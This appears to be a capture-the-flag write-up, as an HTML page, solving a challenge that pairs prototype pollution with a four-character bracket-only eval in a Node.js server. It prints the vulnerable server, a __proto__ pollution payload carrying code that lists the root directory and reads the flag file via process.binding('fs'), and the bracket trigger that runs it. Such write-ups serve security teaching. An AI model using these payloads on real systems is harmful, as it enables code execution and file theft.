@@ -1,0 +1,544 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link href='https://fonts.googleapis.com/css?family=JetBrains Mono' rel='stylesheet'>
+	<link href='/global.css' rel='stylesheet'>
+	<title>pp4</title>
+  </head>
+  <body class="bg-[url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABTElEQVRYha1WWw7DMAjLquYYk7b7H7GTtq9UbWpsQ8fXVh4xJIAfz9f7227IZ9tC3do71bfW2lINPuvW3lP+w2cHgIxHUKZzDhu2yGeZjVAwV6d8EEh4BSw7V6fKvwNwDN37jWId/edYS1TCCqhIfwQ2fg/96QrmDNwyIkDKd+hPAOYgKijKLCt0DszCAKIrUfodQGbgVL9FZywzuqjPWSsie2ULH6HjoCT7kOUbiAI4FWGgYRdkZr4z9ZyxTdsQyR0bmGC1f6PDUIWYXLogCuwcrvzCbej0NRoqTvXUY7XbkA0V9l9t0ss2ZM5uu6kkjnrKB1Bm1fUdAYOUjDlmyov+hwCyC+n4ndEyVTGLEyr9nf0B50C2zJE4I9rmA5XH57wdSEorWSvyETIiNgUjSlWlXxAAU0ZZVRYYpWRD/rWOM7xCEhInuDqM2fwAG58SrpqDi2sAAAAASUVORK5CYII=')] flex flex-col place-items-center min-h-dvh">
+	<div class="bg-(--color-background-one) box-border my-20 border-1 border-(--color-primarygreen) flex flex-col px-5 pb-5 overflow-x-auto font-jetbrains text-lg max-w-95/100">
+		<div class="text-custom-dynamic text-(--color-plaintext)">
+			<h1>The Ark Challenge - pp4</h1>
+<p>We're given the following files.</p>
+<pre class="language-js"><code class="language-js">├── Dockerfile
+├── compose<span class="token punctuation">.</span>yaml
+└── index<span class="token punctuation">.</span>js
+
+<span class="token number">1</span> directory<span class="token punctuation">,</span> <span class="token number">4</span> files</code></pre>
+<p>The <code>server.js</code> file defines a very simple JavaScript server.</p>
+<pre class="language-javascript"><code class="language-javascript"><span class="token hashbang comment">#!/usr/local/bin/node</span>
+<span class="token keyword">const</span> readline <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"node:readline/promises"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> rl <span class="token operator">=</span> readline<span class="token punctuation">.</span><span class="token function">createInterface</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+  <span class="token literal-property property">input</span><span class="token operator">:</span> process<span class="token punctuation">.</span>stdin<span class="token punctuation">,</span>
+  <span class="token literal-property property">output</span><span class="token operator">:</span> process<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> <span class="token function-variable function">clone</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> value <span class="token operator">==</span> <span class="token string">"object"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>key <span class="token keyword">in</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span> result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+      <span class="token function">clone</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> result<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+      result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token comment">// Step 1: Prototype Pollution</span>
+  <span class="token keyword">const</span> json <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">await</span> rl<span class="token punctuation">.</span><span class="token function">question</span><span class="token punctuation">(</span><span class="token string">"Input JSON: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment">// Step 2: JSF**k with 4 characters</span>
+  <span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">await</span> rl<span class="token punctuation">.</span><span class="token function">question</span><span class="token punctuation">(</span><span class="token string">"Input code: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">.</span>size <span class="token operator">></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Too many :("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">finally</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> rl<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>The <code>Dockerfile</code> shows that the flag is stored at <code>/</code> with a name that can't easily be guessed.</p>
+<pre class="language-docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> node:22.9.0-slim <span class="token keyword">AS</span> base</span>
+<span class="token instruction"><span class="token keyword">WORKDIR</span> /app</span>
+
+<span class="token instruction"><span class="token keyword">COPY</span> flag.txt .</span>
+<span class="token instruction"><span class="token keyword">RUN</span> mv flag.txt /flag-$(md5sum flag.txt | cut -c-32).txt</span>
+<span class="token instruction"><span class="token keyword">COPY</span> <span class="token options"><span class="token property">--chmod</span><span class="token punctuation">=</span><span class="token string">555</span></span> index.js run</span>
+
+
+<span class="token instruction"><span class="token keyword">FROM</span> pwn.red/jail</span>
+<span class="token instruction"><span class="token keyword">COPY</span> <span class="token options"><span class="token property">--from</span><span class="token punctuation">=</span><span class="token string">base</span></span> / /srv</span>
+<span class="token instruction"><span class="token keyword">ENV</span> JAIL_TIME=30 JAIL_MEM=50M JAIL_CPU=100 JAIL_PIDS=10</span></code></pre>
+<p>Based on this and the server code we'll:</p>
+<ol>
+<li>Get free prototype pollution.</li>
+<li>Be expected to enumerate and read files from the file system using only four characters in JavaScript.</li>
+</ol>
+<p>Of course, there's the esoteric language <a href="https://jsfuck.com/">JSF**k</a>, but it typically uses six characters: <code>!+[]()</code>. The following dot points show the primitives that are built from those six characters:</p>
+<table>
+<thead>
+<tr>
+<th>Primitive</th>
+<th>JSF**k equivalent</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>false</td>
+<td>![]</td>
+</tr>
+<tr>
+<td>true</td>
+<td>!![]</td>
+</tr>
+<tr>
+<td>undefined</td>
+<td>[][[]]</td>
+</tr>
+<tr>
+<td>NaN</td>
+<td>+[![]]</td>
+</tr>
+<tr>
+<td>0</td>
+<td>+[]</td>
+</tr>
+<tr>
+<td>1</td>
+<td>+!+[]</td>
+</tr>
+<tr>
+<td>2</td>
+<td>!+[]+!+[]</td>
+</tr>
+<tr>
+<td>10</td>
+<td>[+!+[]]+[+[]]</td>
+</tr>
+<tr>
+<td>array</td>
+<td>[]</td>
+</tr>
+<tr>
+<td>number</td>
+<td>+[]</td>
+</tr>
+<tr>
+<td>string</td>
+<td>[]+[]</td>
+</tr>
+<tr>
+<td>boolean</td>
+<td>![]</td>
+</tr>
+<tr>
+<td>function</td>
+<td>[][&quot;filter&quot;]</td>
+</tr>
+<tr>
+<td>eval</td>
+<td>[][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</td>
+</tr>
+<tr>
+<td>window</td>
+<td>[][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</td>
+</tr>
+</tbody>
+</table>
+<p>Since we're limited to just four characters, we'll try to recreate these primitives using:</p>
+<ul>
+<li>The square brackets (<code>[]</code>), because they're so versatile.</li>
+<li>The normal brackets (<code>()</code>), because we'll need them to call functions.</li>
+</ul>
+<p>Realistically though, we may not need all of these primitives in our approach. In fact, our only goal is to build the <code>eval</code> primitive and pass an arbitrary string as the <code>CODE</code> parameter. If we can do that, then we should be able to read files from the file system.</p>
+<p>You would've noticed though that the <code>eval</code> &quot;primitive&quot; relies on a lot of the other primitives. For example, building the <code>&quot;filter&quot;</code>, <code>&quot;constructor&quot;</code>, and <code>CODE</code> strings requires letters, which we have to pull from strings that already exist. In JS**k, you could get the letter <code>&quot;a&quot;</code> from <code>(false+&quot;&quot;)[1]</code> =&gt; <code>(![]+[]+[])[+!+[]]</code>. Obviously this approach is much too complicated for our four letters, but we can solve the issue using the prototype pollution we were given.</p>
+<p>For each string we need, we can define it on the prototype object using the prototype pollution, but we'll need some way of referencing it. Through some experimentation, I came up with two indexes we can use.</p>
+<table>
+<thead>
+<tr>
+<th>Normal JavaScript</th>
+<th>4 char equivalent</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>[][&quot;&quot;]</td>
+<td>[][[]]</td>
+</tr>
+<tr>
+<td>[][&quot;undefined&quot;]</td>
+<td>[][[][[][[]]]]</td>
+</tr>
+</tbody>
+</table>
+<p>This means we can define and use two arbitrary strings by submitting the following prototype pollution payload.</p>
+<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+    <span class="token property">""</span><span class="token operator">:</span> <span class="token string">"filter"</span><span class="token punctuation">,</span>
+    <span class="token property">"undefined"</span><span class="token operator">:</span> <span class="token string">"constructor"</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>The following table shows the evaluation of the indexes we just made after the above pollution is done.</p>
+<table>
+<thead>
+<tr>
+<th>Normal JavaScript</th>
+<th>4 char equivalent</th>
+<th>Returns</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>[][&quot;&quot;]</td>
+<td>[][[]]</td>
+<td>&quot;filter&quot;</td>
+</tr>
+<tr>
+<td>[][&quot;undefined&quot;]</td>
+<td>[][[][[][[]]]]</td>
+<td>&quot;constructor&quot;</td>
+</tr>
+</tbody>
+</table>
+<p>We have a problem though, we actually need three arbitrary strings to build our <code>eval</code> primitive, recall: <code>[][&quot;filter&quot;][&quot;constructor&quot;](&quot;CODE&quot;)()</code>. To get more strings, we can nest another object under one of these indexes. For example:</p>
+<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+    <span class="token property">""</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+      <span class="token property">""</span><span class="token operator">:</span> <span class="token string">"filter"</span><span class="token punctuation">,</span>
+      <span class="token property">"undefined"</span><span class="token operator">:</span> <span class="token string">"console.log(1+1)"</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+    <span class="token property">"undefined"</span><span class="token operator">:</span> <span class="token string">"constructor"</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>The below table shows how we can reference each of these strings.</p>
+<table>
+<thead>
+<tr>
+<th>Normal JavaScript</th>
+<th>4 char equivalent</th>
+<th>Returns</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>[][&quot;&quot;][&quot;&quot;]</td>
+<td>[][[]][[]]</td>
+<td>&quot;filter&quot;</td>
+</tr>
+<tr>
+<td>[][&quot;&quot;][&quot;undefined&quot;]</td>
+<td>[][[]][[][[][[]]]]</td>
+<td>&quot;console.log(1+1)&quot;</td>
+</tr>
+<tr>
+<td>[][&quot;undefined&quot;]</td>
+<td>[][[][[][[]]]]</td>
+<td>&quot;constructor&quot;</td>
+</tr>
+</tbody>
+</table>
+<p>Combining these, we can now reach the <code>Function()</code> constructor and call it.</p>
+<table>
+<thead>
+<tr>
+<th>Normal JavaScript</th>
+<th>4 char equivalent</th>
+<th>Returns</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>[][&quot;filter&quot;]</td>
+<td>[][[][[]][[]]]</td>
+<td><code>Array.filter()</code></td>
+</tr>
+<tr>
+<td>[][&quot;filter&quot;][&quot;constructor&quot;]</td>
+<td>[][[][[]][[]]][[][[][[][[]]]]]</td>
+<td><code>Function()</code></td>
+</tr>
+<tr>
+<td>[][&quot;filter&quot;][&quot;constructor&quot;](&quot;console.log(1+1)&quot;)()</td>
+<td>[][[][[]][[]]][[][[][[][[]]]]]([][[]][[][[][[]]]])()</td>
+<td><code>undefined</code> (also prints <code>2</code>, as a result of successful execution)</td>
+</tr>
+</tbody>
+</table>
+<p>With this, the final part of the puzzle is figuring out how to enumerate and read files from the file system. This is made slightly more difficult because calling <code>Function(&quot;code&quot;)()</code> creates an anonymous function, meaning we can only access global variables. NodeJS documents globals here: <a href="https://nodejs.org/api/globals.html">https://nodejs.org/api/globals.html</a>, and conveniently there are a lot of useful things we can access. I used <code>process.binding</code> (<a href="https://nodejs.org/api/all.html#DEP0111">which is only intended for use by internal NodeJS code</a>) to get access to <code>fs</code> functions.</p>
+<pre class="language-javascript"><code class="language-javascript">flag_filename<span class="token operator">=</span>process<span class="token punctuation">.</span><span class="token function">binding</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readdir</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token operator">=></span>value<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">binding</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileUtf8</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token operator">+</span>flag_filename<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>Putting this together, our final payloads are as below.</p>
+<p><strong>Prototype Pollution</strong></p>
+<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+    <span class="token property">""</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+      <span class="token property">""</span><span class="token operator">:</span> <span class="token string">"filter"</span><span class="token punctuation">,</span>
+      <span class="token property">"undefined"</span><span class="token operator">:</span> <span class="token string">"flag_filename = process.binding('fs').readdir('/',0,0).find(value => value.includes('flag')); console.log(process.binding('fs').readFileUtf8('/'+flag_filename, 0))"</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+    <span class="token property">"undefined"</span><span class="token operator">:</span> <span class="token string">"constructor"</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p><strong>4 Character JSF**k</strong></p>
+<pre class="language-javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>Sending this to the remote server, we get the flag.</p>
+<pre class="language-sh"><code class="language-sh">└─$ <span class="token function">nc</span> localhost <span class="token number">5000</span>
+Input JSON: <span class="token punctuation">{</span><span class="token string">"__proto__"</span>:<span class="token punctuation">{</span><span class="token string">""</span>:<span class="token punctuation">{</span><span class="token string">""</span><span class="token builtin class-name">:</span><span class="token string">"filter"</span>,<span class="token string">"undefined"</span><span class="token builtin class-name">:</span><span class="token string">"flag_filename=process.binding('fs').readdir('/',0,0).find(value=>value.includes('flag'));console.log(process.binding('fs').readFileUtf8('/'+flag_filename,0))"</span><span class="token punctuation">}</span>,<span class="token string">"undefined"</span><span class="token builtin class-name">:</span><span class="token string">"constructor"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token punctuation">}</span>
+Input code: <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+SECCON<span class="token punctuation">{</span>dummy<span class="token punctuation">}</span></code></pre>
+<p>The below table shows all the JSF**k we used to build our final payload, hover over parts of the table to see how they all tied together.</p>
+<table>
+<thead>
+<tr>
+<th>Normal JavaScript</th>
+<th>4 char equivalent</th>
+<th>Returns</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="undefined">undefined</span></td>
+<td><span class="undefined">[][[][[]]]</span></td>
+<td><span class="undefined">undefined</span></td>
+</tr>
+<tr>
+<td>[][<span class="undefined">&quot;undefined&quot;</span>]</td>
+<td>[][<span class="undefined">[][[][[]]]</span>]</td>
+<td><span class="constructor">&quot;constructor&quot;</span></td>
+</tr>
+<tr>
+<td><span class="emptyString">[][&quot;&quot;]</span></td>
+<td><span class="emptyString">[][[]]</span></td>
+<td><span class="emptyString">{&quot;&quot;:&quot;filter&quot;, undefined: &quot;console.log(1+1)&quot;}</span></td>
+</tr>
+<tr>
+<td><span class="emptyString">[][&quot;&quot;]</span>[&quot;&quot;]</td>
+<td><span class="emptyString">[][[]]</span>[[]]</td>
+<td><span class="filter">&quot;filter&quot;</span></td>
+</tr>
+<tr>
+<td><span class="emptyString">[][&quot;&quot;]</span>[<span class="undefined">&quot;undefined&quot;</span>]</td>
+<td><span class="emptyString">[][[]]</span>[<span class="undefined">[][[][[]]]</span>]</td>
+<td><span class="arbString">&quot;console.log(1+1)&quot;</span></td>
+</tr>
+<tr>
+<td>[][<span class="filter">&quot;filter&quot;</span>]</td>
+<td>[][<span class="filter">[][[]][[]]</span>]</td>
+<td>Array.filter()</td>
+</tr>
+<tr>
+<td>[][<span class="filter">&quot;filter&quot;</span>][<span class="constructor">&quot;constructor&quot;</span>]</td>
+<td>[][<span class="filter">[][[]][[]]</span>][<span class="constructor">[][[][[][[]]]]</span>]</td>
+<td>Function()</td>
+</tr>
+<tr>
+<td>[][<span class="filter">&quot;filter&quot;</span>][<span class="constructor">&quot;constructor&quot;</span>](<span class="arbString">&quot;console.log(1+1)&quot;</span>)()</td>
+<td>[][<span class="filter">[][[]][[]]</span>][<span class="constructor">[][[][[][[]]]]</span>](<span class="arbString">[][[]][[][[][[]]]]</span>)()</td>
+<td>undefined (also prints 2, as a result of successful execution)</td>
+</tr>
+</tbody>
+</table>
+<style>
+    /* Inspired by Rebane (https://lyra.horse/blog/2024/05/exploiting-v8-at-openecsc/) */
+    :root {
+        --sbrackets0F: #cc241d;
+        --sbrackets0B: var(--color-background-one);
+        --sbrackets1F: #98971a;
+        --sbrackets1B: var(--color-background-one);
+        --sbrackets2F: #d79921;
+        --sbrackets2B: var(--color-background-one);
+
+        --emptyString0F: #8ec07c;
+        --emptyString0B: var(--color-background-one);
+
+        --filter0F: #fb4934;
+        --filter0B: var(--color-background-one);
+
+        --undefined0F: #b16286;
+        --undefined0B: var(--color-background-one);
+
+        --constructor0F: #b8bb26;
+        --constructor0B: var(--color-background-one);
+
+        --arbString0F: #fabd2f;
+        --arbString0B: var(--color-background-one);
+
+        --brackets0F: #a89984;
+        --brackets0B: var(--color-background-one);
+        --brackets1F: #ebdbb2;
+        --brackets1B: var(--color-background-one);
+
+    }
+
+    .emptyString  { color: var(--emptyString0F); background: var(--emptyString0B); }
+    .undefined    { color: var(--undefined0F); background: var(--undefined0B); }
+    .constructor  { color: var(--constructor0F); background: var(--constructor0B); }
+    .filter       { color: var(--filter0F); background: var(--filter0B); }
+    .arbString    { color: var(--arbString0F); background: var(--arbString0B); }
+    .sbrackets0   { color: var(--sbrackets0F); background: var(--sbrackets0B); }
+    .sbrackets1   { color: var(--sbrackets1F); background: var(--sbrackets1B); }
+    .sbrackets2   { color: var(--sbrackets2F); background: var(--sbrackets2B); }
+    .brackets0    { color: var(--brackets0F); background: var(--brackets0B); }
+    .brackets1    { color: var(--brackets1F); background: var(--brackets1B); }
+    table:has(.emptyString:hover) { 
+        --emptyString0B: var(--color-highlight);
+    }
+    table:has(.undefined:hover) {
+        --undefined0B: var(--color-highlight);
+    }
+    table:has(.constructor:hover) {
+        --constructor0B: var(--color-highlight);
+    }
+    table:has(.filter:hover) {
+        --filter0B: var(--color-highlight);
+    }
+    table:has(.arbString:hover) {
+        --arbString0B: var(--color-highlight);
+    }
+</style>
+
+		</div>
+	</div>
+  </body>
+
+
+	<style>
+		/**
+		 * Gruvbox dark theme
+		 *
+		 * Adapted from a theme based on:
+		 * Vim Gruvbox dark Theme (https://github.com/morhetz/gruvbox)
+		 *
+		 * @author Azat S. <to@azat.io>
+		 * @version 1.0
+		 */
+
+		code[class*="language-"],
+		pre[class*="language-"] {
+			color: #ebdbb2; /* fg1 / fg */
+			font-family: Consolas, Monaco, "Andale Mono", monospace;
+			direction: ltr;
+			text-align: left;
+			white-space: pre;
+			word-spacing: normal;
+			word-break: normal;
+			line-height: 1.5;
+
+			-moz-tab-size: 4;
+			-o-tab-size: 4;
+			tab-size: 4;
+
+			-webkit-hyphens: none;
+			-moz-hyphens: none;
+			-ms-hyphens: none;
+			hyphens: none;
+		}
+
+		pre[class*="language-"]::-moz-selection,
+		pre[class*="language-"] ::-moz-selection,
+		code[class*="language-"]::-moz-selection,
+		code[class*="language-"] ::-moz-selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		pre[class*="language-"]::selection,
+		pre[class*="language-"] ::selection,
+		code[class*="language-"]::selection,
+		code[class*="language-"] ::selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		/* Code blocks */
+		pre[class*="language-"] {
+			padding: 1em;
+			margin: 0.5em 0;
+			overflow: auto;
+		}
+
+		:not(pre) > code[class*="language-"],
+		pre[class*="language-"] {
+			background: #191B1C; /* bg0_h */
+			border: 1px solid #665C54;
+		}
+
+		/* Inline code */
+		:not(pre) > code[class*="language-"] {
+			padding: 0.1em;
+			border-radius: 0.3em;
+		}
+
+		.token.comment,
+		.token.prolog,
+		.token.cdata {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.delimiter,
+		.token.boolean,
+		.token.keyword,
+		.token.selector,
+		.token.important,
+		.token.atrule {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.operator,
+		.token.punctuation,
+		.token.attr-name {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.tag,
+		.token.tag .punctuation,
+		.token.doctype,
+		.token.builtin {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.entity,
+		.token.number,
+		.token.symbol {
+			color: #d3869b; /* purple2 */
+		}
+
+		.token.property,
+		.token.constant,
+		.token.variable {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.string,
+		.token.char {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.attr-value,
+		.token.attr-value .punctuation {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.url {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.function {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.regex {
+			background: oklch(0.8591 0 126.59 / 15.94%); /* green2 */
+		}
+
+		.token.bold {
+			font-weight: bold;
+		}
+
+		.token.italic {
+			font-style: italic;
+		}
+
+		.token.inserted {
+			background: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.deleted {
+			background: #fb4934; /* red2 */
+		}
+	</style>
+</html>
